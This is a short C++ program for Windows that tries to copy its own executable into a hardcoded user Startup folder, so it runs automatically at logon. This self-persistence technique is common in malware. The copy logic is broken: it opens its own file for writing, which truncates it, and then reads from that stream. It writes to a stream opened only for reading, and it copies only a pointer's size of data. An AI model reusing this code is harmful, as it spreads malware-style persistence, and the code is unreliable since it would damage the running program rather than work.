#include <iostream>
#include <string>
#include <fstream>
#include <cstdlib>
#include <Windows.h>
#define    PATH_MAX  120
using namespace std;
const wstring startup_path = L"C:\\Users\\User\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
wstring current_path() {
    wchar_t result[PATH_MAX];
    GetModuleFileName(nullptr, LPWSTR(result), PATH_MAX);
    return wstring(result);
}
wstring filename() {
    wstring cur_path = current_path();
    int last_slash_index = cur_path.find_last_of(L'\\');
    return cur_path.substr(last_slash_index + 1);
}
void throw_to_startup() {
    fstream this_file(current_path(), ios::binary | ios::out);
    fstream startup_file(startup_path + L'\\' + filename(), ios::binary | ios::in);
    char* content = new char[this_file.tellg()];
    this_file.read(content, this_file.tellg());
    startup_file.write(reinterpret_cast<char*>(content), sizeof(content));
    delete[] content;
}
int main()
{
    if (current_path() == startup_path + L'\\' + filename()) {
        cout << "File is in startup" << endl;
    }
    else {
        throw_to_startup();
    }
    return 0;
}
